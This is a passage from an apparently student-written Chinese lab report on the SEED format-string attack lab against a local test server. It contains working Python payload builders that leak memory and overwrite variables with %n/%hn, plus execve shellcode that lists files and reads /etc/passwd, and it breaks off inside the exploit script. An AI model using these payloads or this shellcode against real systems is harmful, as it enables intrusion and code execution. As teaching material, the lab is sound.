alt="image-20211201150559167"></p></li></ol><h2 id="4-任务2：打印出服务器程序的内存"><a href="#4-任务2：打印出服务器程序的内存" class="headerlink" title="4 任务2：打印出服务器程序的内存"></a>4 任务2：打印出服务器程序的内存</h2><p>​        此任务的目标是让服务器从其内存中打印出一些数据（我们将继续使用 10.9.0.5）。 数据会在服务器端打印出来，攻击者看不到。 因此，这不是一次有意义的攻击，但此任务中使用的技术对于后续任务至关重要。</p><h3 id="任务2-A：栈数据（Stack-Data）"><a href="#任务2-A：栈数据（Stack-Data）" class="headerlink" title="任务2.A：栈数据（Stack Data）"></a>任务2.A：栈数据（Stack Data）</h3><p>​        目标是打印出堆栈上的数据。得到需要多少个 %x 格式说明符才能让服务器程序打印出输入的前四个字节？ 你可以在那里放一些唯一的数字（4个字节），所以当它们被打印出来时，你可以立即知道。这个数字对于大多数后续任务都是必不可少的。</p><h3 id="任务2-B：堆数据（Heap-Data）"><a href="#任务2-B：堆数据（Heap-Data）" class="headerlink" title="任务2.B：堆数据（Heap Data）"></a>任务2.B：堆数据（Heap Data）</h3><p>​        堆区中存储了一个秘密消息（一个字符串），可以从服务器打印输出中找到该字符串的地址。 目标是打印出这个秘密信息。 为实现此目标，需要将秘密消息的地址（以二进制形式）放入格式字符串中。<br>​        大多数计算机都是小端机器，因此为了在内存中存储地址 0xAABBCCDD（32 位机器上的四个字节），最低有效字节 0xDD 存储在低地址，而最高有效字节 0xAA 存储在高地址。 因此，当我们将地址存储在缓冲区中时，我们需要使用以下顺序进行保存：0xDD、0xCC、0xBB，然后是 0xAA。 在 Python 中，您可以执行以下操作：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">number = <span class="hljs-number">0xAABBCCDD</span><br>content[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>] = (number).to_bytes(<span class="hljs-number">4</span>,byteorder=’little’)<br></code></pre></div></td></tr></table></figure><h3 id="实验操作-4"><a href="#实验操作-4" class="headerlink" title="实验操作"></a>实验操作</h3><h4 id="2-A"><a href="#2-A" class="headerlink" title="2.A"></a>2.A</h4><ol><li><p>编写一个生成字符串的python程序<code>task2A.py</code>。运行它，使字符串（0x20190806的字节形式和499个“%x|”）保存在<code>badfile2A</code>中。</p><p>（%x：将参数视为unsigned int类型（4字节），并用十六进制的格式打印出来。当printf()遇到%x时，它打印出va_list指针指向的数，并将va_list推进4个字节）。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#task2A.py</span><br><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br>N = <span class="hljs-number">1500</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br>number  = <span class="hljs-number">0x20190806</span><br>content[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]  =  (number).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>s = <span class="hljs-string">&quot;%x|&quot;</span>*<span class="hljs-number">499</span><br>fmt  = (s).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">4</span>:<span class="hljs-number">4</span>+<span class="hljs-built_in">len</span>(fmt)] = fmt<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile2A&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></div></td></tr></table></figure><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201151707668.png" alt="image-20211201151707668"></p></li><li><p>向服务器server-10.9.0.5提供输入，输入为<code>badfile2A</code>的内容。得到服务器打印出的内容。</p><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201150258693.png" alt="image-20211201150258693"></p><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201150214883.png" alt="image-20211201150214883"></p></li><li><p>将服务器输出中<code>20190806|</code>及之前根据<code>%x</code>打印出的字符串复制到一个文件<code>count.txt</code>中。</p><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201150352151.png" alt="image-20211201150352151"></p></li><li><p>通过<code>grep</code>相关命令得到<code>|</code>的个数为64。即可以得到需要64个 %x 格式说明符才能让服务器程序打印出输入的前四个字节<code>0x20190806</code>（63个%x将va_list指针移动至输入的起始地址）。</p><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201150332057.png" alt="image-20211201150332057"></p></li></ol><h4 id="2-B"><a href="#2-B" class="headerlink" title="2.B"></a>2.B</h4><ol><li><p>根据服务器的输出<code>The secret message’s address: 0x080b4008</code>，得到秘密信息的地址为<code>0x080b4008</code>。编写一个生成字符串的python程序<code>task2B.py</code>。运行它，使字符串（由0x080b4008的字节形式，63个”%x”和”\nsecret message:%s”构成）保存在<code>badfile12AB</code>中。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#task2B.py</span><br><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br>N = <span class="hljs-number">1500</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br>number  = <span class="hljs-number">0x080b4008</span><br>content[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]  =  (number).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>s = <span class="hljs-string">&quot;%x&quot;</span>*<span class="hljs-number">63</span>+<span class="hljs-string">&quot;\nsecret message:%s&quot;</span><br>fmt  = (s).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">4</span>:<span class="hljs-number">4</span>+<span class="hljs-built_in">len</span>(fmt)] = fmt<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile2B&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></div></td></tr></table></figure></li><li><p>向服务器server-10.9.0.5提供输入，输入为<code>badfile2B</code>的内容。得到服务器打印出的内容。故秘密信息(secret message)为<code>A secret message</code></p><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201151730211.png" alt="image-20211201151730211"></p><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201151845038.png" alt="image-20211201151845038"></p></li></ol><h2 id="5-任务3：修改服务器程序的内存"><a href="#5-任务3：修改服务器程序的内存" class="headerlink" title="5 任务3：修改服务器程序的内存"></a>5 任务3：修改服务器程序的内存</h2><p>​        此任务的目标是修改服务器程序中定义的目标变量的值（我们将继续使用 10.9.0.5）。target 的原始值为 0x11223344。假设这个变量拥有一个重要的值，它会影响程序的控制流程。如果远程攻击者可以改变它的值，他们就可以改变这个程序的行为。我们有三个子任务。</p><h3 id="任务3-A：将值更改为不同的值"><a href="#任务3-A：将值更改为不同的值" class="headerlink" title="任务3.A：将值更改为不同的值"></a>任务3.A：将值更改为不同的值</h3><p>​        在这个子任务中，我们需要将目标变量的内容更改为其他内容。 如果您可以将其更改为不同的值，无论它可能是什么值，您的任务都被视为成功。 目标变量的地址可以从服务器打印输出中找到。</p><h3 id="任务3-B：将值更改为-0x5000"><a href="#任务3-B：将值更改为-0x5000" class="headerlink" title="任务3.B：将值更改为 0x5000"></a>任务3.B：将值更改为 0x5000</h3><p>​        在此子任务中，我们需要将目标变量的内容更改为特定值 0x5000。只有当变量的值变为 0x5000 时，任务才被视为成功。</p><h3 id="任务3-C：将值更改为-0xAABBCCDD。"><a href="#任务3-C：将值更改为-0xAABBCCDD。" class="headerlink" title="任务3.C：将值更改为 0xAABBCCDD。"></a>任务3.C：将值更改为 0xAABBCCDD。</h3><p>​        这个子任务与上一个类似，只是目标值现在是一个很大的数字。在格式字符串攻击中，该值是 <code>printf()</code> 函数打印出的字符总数； 打印出如此大量的字符可能需要几个小时。 您需要使用更快的方法。 基本思想是使用<code>%hn</code>或<code>%hhn</code>，而不是<code>%n</code>，这样我们就可以修改一个两字节（或一字节）的内存空间，而不是四个字节。 打印出$2^{16}$个字符不需要太多时间。</p><h3 id="实验操作-5"><a href="#实验操作-5" class="headerlink" title="实验操作"></a>实验操作</h3><h4 id="3-A"><a href="#3-A" class="headerlink" title="3.A"></a>3.A</h4><ol><li><p>根据服务器的输出<code>The target variable’s address: 0x080e5068</code>，得到目标变量（<code>target variable</code>）的地址为<code>0x080e5068</code>。编写一个生成字符串的python程序<code>task3A.py</code>。运行它，使字符串（0x080e5068的字节形式、63个”.%x”、1个”%n”、结尾”\n”）保存在<code>badfile3A</code>中。<br> （当printf()遇到%n时，它会获取va_list指针指向的值，将视该值为一个内存地址，然后将数据（已打印出的字符的个数）写入该地址）。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#task3A.py</span><br><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br>N = <span class="hljs-number">1500</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br>number  = <span class="hljs-number">0x080e5068</span><br>content[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]  =  (number).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>s = <span class="hljs-string">&quot;.%x&quot;</span>*<span class="hljs-number">63</span>+<span class="hljs-string">&quot;%n\n&quot;</span><br>fmt  = (s).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">4</span>:<span class="hljs-number">4</span>+<span class="hljs-built_in">len</span>(fmt)] = fmt<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile3A&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></div></td></tr></table></figure><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201154021212.png" alt="image-20211201154021212"></p></li><li><p>向服务器server-10.9.0.5提供输入，输入为<code>badfile3A</code>的内容。得到服务器打印出的内容。得到目标变量（<code>target variable</code>）的值变为<code>0x00000012b</code>。</p><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201154405920.png" alt="image-20211201154405920"></p><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201155539801.png" alt="image-20211201155539801"></p></li></ol><h4 id="3-B"><a href="#3-B" class="headerlink" title="3.B"></a>3.B</h4><ol><li><p><code>0x5000=20480=4+62*325+326</code>，故编写一个生成字符串（0x080e5068的字节形式（长度为4个字符）、62个”%.325x”、1个”%.326x”、1个”%n”、结尾”\n”）的python程序<code>task3B.py</code>。运行它，使该字符串保存在<code>badfile3B</code>中。</p><p>（精度修饰符形如”.number“，当应用于整型值时，它控制最少打印多少位字符）</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#task3B.py</span><br><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br>N = <span class="hljs-number">1500</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br>number  = <span class="hljs-number">0x080e5068</span><br>content[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]  =  (number).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>s = <span class="hljs-string">&quot;%.325x&quot;</span>*<span class="hljs-number">62</span>+<span class="hljs-string">&quot;%.326x&quot;</span>+<span class="hljs-string">&quot;%n\n&quot;</span><br>fmt  = (s).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">4</span>:<span class="hljs-number">4</span>+<span class="hljs-built_in">len</span>(fmt)] = fmt<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile3B&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></div></td></tr></table></figure><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201162008447.png" alt="image-20211201162008447"></p></li><li><p>向服务器server-10.9.0.5提供输入，输入为<code>badfile3B</code>的内容。得到服务器打印出的内容。得到目标变量（<code>target variable</code>）的值变为<code>0x00005000</code>。</p><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201162034070.png" alt="image-20211201162034070"></p><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201161817247.png" alt="image-20211201161817247"></p><p>中间省略…</p><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201161838430.png" alt="image-20211201161838430"></p></li></ol><h4 id="3-C"><a href="#3-C" class="headerlink" title="3.C"></a>3.C</h4><ol><li><p>因为0xAA=170&lt;4*64，故选用%hn（视参数视为2字节字符型数），即每次只修改两个字节的值。根据小端法，目标变量（<code>target variable</code>）从最高两位字节的地址为<code>0x080e506a</code>、最低两位字节的地址为<code>0x080e5068</code>。</p><p>故字符串开头为数字0x080e506a+”@@@@”+数字0x080e5068。共12个字符。</p><p>（printf()通过格式化字符%x经过”@@@@”才能改变%n对应数据——已打印出的字符的个数，给下一个地址赋更大的值）</p><ul><li>0xAABB=43707，43707=12+693*62+729</li><li>0xCCDD-0xAABB=8738。</li></ul><p>故字符串由0x080e506a的字节形式、”@@@@”、0x080e5068的字节形式、62个”%.693x”、1个”%.729x”、1个”%hn”、1个”%.8738x”、1个”%hn”、结尾”\n”组成。</p><p>编写一个生成该字符串的python程序<code>task3C.py</code>。运行它，使该字符串保存在<code>badfile3C</code>中。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#task3C.py</span><br><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-comment">#AA 0x080e506b</span><br><span class="hljs-comment">#BB 0x080e506a</span><br><span class="hljs-comment">#CC 0x080e5069</span><br><span class="hljs-comment">#DD 0x080e5068</span><br><span class="hljs-keyword">import</span> sys<br>N = <span class="hljs-number">1500</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br><br>number  = <span class="hljs-number">0x080e506a</span><br>content[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]  =  (number).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>content[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>]  =  (<span class="hljs-string">&quot;@@@@&quot;</span>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br>number  = <span class="hljs-number">0x080e5068</span><br>content[<span class="hljs-number">8</span>:<span class="hljs-number">12</span>]  =  (number).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>s=<span class="hljs-string">&quot;%.693x&quot;</span>*<span class="hljs-number">62</span>+<span class="hljs-string">&quot;%.729x&quot;</span>+<span class="hljs-string">&quot;%hn&quot;</span>+<span class="hljs-string">&quot;%.8738x&quot;</span>+<span class="hljs-string">&quot;%hn\n&quot;</span><br>fmt  = (s).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">12</span>:<span class="hljs-number">12</span>+<span class="hljs-built_in">len</span>(fmt)] = fmt<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile3C&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></div></td></tr></table></figure><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201171027112.png" alt="image-20211201171027112"></p></li><li><p>向服务器server-10.9.0.5提供输入，输入为<code>badfile3C</code>的内容。得到服务器打印出的内容。得到目标变量（<code>target variable</code>）的值变为<code>0xaabbccdd</code>。</p><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201171129393.png" alt="image-20211201171129393"></p><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201171214123.png" alt="image-20211201171214123"></p><p>中间省略…</p><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201171233679.png" alt="image-20211201171233679"></p></li></ol><h2 id="6-任务4：将恶意代码注入服务器程序"><a href="#6-任务4：将恶意代码注入服务器程序" class="headerlink" title="6 任务4：将恶意代码注入服务器程序"></a>6 任务4：将恶意代码注入服务器程序</h2><p>​        现在我们已经准备好追逐这次攻击的皇冠上的明珠——代码注入。 我们想将一段二进制格式的恶意代码注入服务器的内存中，然后利用格式化字符串漏洞修改函数的返回地址字段，因此当函数返回时，它会跳转到我们注入的代码。<br>​        用于此任务的技术与前一任务中的技术类似：它们都修改内存中的4字节数字。前一个任务修改目标变量，而这个任务修改函数的返回地址字段。我们需要根据服务器打印出来的信息，计算返回地址字段的地址。</p><h3 id="6-1-了解栈的布局"><a href="#6-1-了解栈的布局" class="headerlink" title="6.1 了解栈的布局"></a>6.1 了解栈的布局</h3><p>​        要成功完成此任务，必须了解在myprintf() 中调用 printf() 函数时的堆栈布局。 图1描述了堆栈布局。 需要注意的是，我们故意在 main 和 myprintf 函数之间放置了一个虚拟栈帧，但是图中没有显示。 </p><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201194243554.png" alt="image-20211201194243554"></p><p>在完成这项任务之前，需要回答以下问题：</p><p>问题 1： ②和 ③ 标记的位置的内存地址是什么？</p><p>得到：</p><ul><li>②：myprintf()的返回地址存储的地址。</li><li>③：用户输入的起始地址。</li></ul><p>问题2：我们需要多少个 %x 格式说明符才能将格式字符串参数指针移动到 ③？ 记住，参数指针从①上面的位置开始。</p><ul><li>根据任务2.A可以得到，我们需要63个 %x 格式说明符才能将格式字符串参数指针移动到 ③。</li></ul><h3 id="6-2-shellcode"><a href="#6-2-shellcode" class="headerlink" title="6.2 shellcode"></a>6.2 shellcode</h3><p>​        Shellcode 通常用于代码注入攻击。 它基本上是一段启动 shell 的代码，通常用汇编语言编写。 本实验仅提供一个通用Shellcode的二进制版本。</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">shellcode = (<br>&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;<br>&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;<br>&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;<br>&quot;/bin/bash*&quot; ①<br>&quot;-c*&quot; ②<br>&quot;/bin/ls -l; echo Hello; /bin/tail -n 2 /etc/passwd *&quot; ③<br><span class="hljs-meta prompt_"># </span><span class="language-bash">The * <span class="hljs-keyword">in</span> this line serves as the position marker *</span><br>&quot;AAAA&quot; # Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;<br>&quot;BBBB&quot; # Placeholder for argv[1] --&gt; &quot;-c&quot;<br>&quot;CCCC&quot; # Placeholder for argv[2] --&gt; the command string<br>&quot;DDDD&quot; # Placeholder for argv[3] --&gt; NULL<br>).encode(’latin-1’)<br></code></pre></div></td></tr></table></figure><p>​        shellcode 运行<code>“/bin/bash”</code>shell 程序（行①），但它被赋予两个参数，<code>“-c”</code>（行②）和一个命令字符串（行③）。 这表明 shell 程序将运行第二个参数中的命令。 这些字符串末尾的*只是一个占位符，在shellcode执行过程中会被一字节的0x00替换。 每个字符串的末尾都需要有一个零，但我们不能在 shellcode 中放置零。因此，我们在每个字符串的末尾放置一个占位符，然后在执行期间动态地在占位符中放置一个零。<br>​        如果我们想让shellcode运行一些其他的命令，我们只需要修改行③中的命令字符串。但是，在进行更改时，我们需要确保不要更改此字符串的长度，因为 argv[] 数组的占位符的起始位置，就在命令字符串之后，是硬编码在Shellcode的代码。 如果我们改变长度，我们需要修改二进制部分。可以添加或删除空格将字符串末尾的星号保持在相同位置。</p><p>​        32位和64位版本的shellcode都包含在<code>attack-code</code>文件夹内的<code>exploit.py</code>中。 您可以使用它们来构建格式字符串。</p><h3 id="6-3-具体任务"><a href="#6-3-具体任务" class="headerlink" title="6.3 具体任务"></a>6.3 具体任务</h3><p>​        请构建输入，将其提供给服务器程序，并证明可以成功地让服务器运行您的 shellcode。<br>​        请在图上标记您的恶意代码的存储位置。</p><p>​        <img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211202095518910.png" alt="image-20211202095518910"></p><h4 id="获得反向shell"><a href="#获得反向shell" class="headerlink" title="获得反向shell"></a>获得反向shell</h4><p>​        我们对运行一些预先确定的命令不感兴趣。 我们想要在目标服务器上获得一个 root shell，所以我们可以输入我们想要的任何命令。 由于我们在远程机器上，如果我们只是让服务器运行/bin/bash，我们将无法控制shell程序。</p><p>​        反向shell是解决这个问题的典型技术。 实验说明的第 9 节提供了有关如何运行反向 shell 的详细说明。 请修改shellcode中的命令字符串，以便可以在目标服务器上获得一个反向shell。 </p><h3 id="实验操作-6"><a href="#实验操作-6" class="headerlink" title="实验操作"></a>实验操作</h3><ol><li><p>这里我准备将shellcode放在输入的尾部。使用<code>%.numberx</code>移动<code>va_list</code>指针并修改已打印字符的值，<code>.number</code>为精度修饰符。然后选用<code>%hn</code>，单次修改2个字节，将myprint的返回地址修改为shellcode的入口地址。补全后的python程序<code>exploit.py</code>及相关注释如下：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># 32-bit Generic Shellcode </span><br>shellcode_32 = (<br>   <span class="hljs-string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span><br>   <span class="hljs-string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span><br>   <span class="hljs-string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span><br>   <span class="hljs-string">&quot;/bin/bash*&quot;</span><br>   <span class="hljs-string">&quot;-c*&quot;</span><br>   <span class="hljs-comment"># The * in this line serves as the position marker         *</span><br>   <span class="hljs-string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span><br>   <span class="hljs-string">&quot;AAAA&quot;</span>   <span class="hljs-comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span><br>   <span class="hljs-string">&quot;BBBB&quot;</span>   <span class="hljs-comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span><br>   <span class="hljs-string">&quot;CCCC&quot;</span>   <span class="hljs-comment"># Placeholder for argv[2] --&gt; the command string</span><br>   <span class="hljs-string">&quot;DDDD&quot;</span>   <span class="hljs-comment"># Placeholder for argv[3] --&gt; NULL</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br><br><span class="hljs-comment"># 64-bit Generic Shellcode </span><br>shellcode_64 = (<br>   <span class="hljs-string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span><br>   <span class="hljs-string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span><br>   <span 